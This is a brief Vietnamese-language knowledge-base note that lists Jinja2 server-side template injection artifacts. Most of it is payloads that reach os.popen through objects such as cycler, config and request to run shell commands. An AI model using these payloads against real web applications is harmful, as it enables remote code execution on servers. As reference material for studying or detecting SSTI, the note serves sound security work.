---
title: Jinja2 / Mako Artifacts
type: entity
related: [[Jinja2 / Mako SSTI]]
---

Các artifact Python/Jinja được nhắc đến:

- `''.__class__.__mro__[1].__subclasses__()`
- `cycler.__init__.__globals__.os.popen('id').read()`
- `request.application.__globals__.__builtins__.__import__('os').popen('id').read()`
- `config.__class__.__init__.__globals__['os'].popen('id').read()`
- `|attr('__class__')`
- `request.environ`
- `request`
- `config`
- `cycler`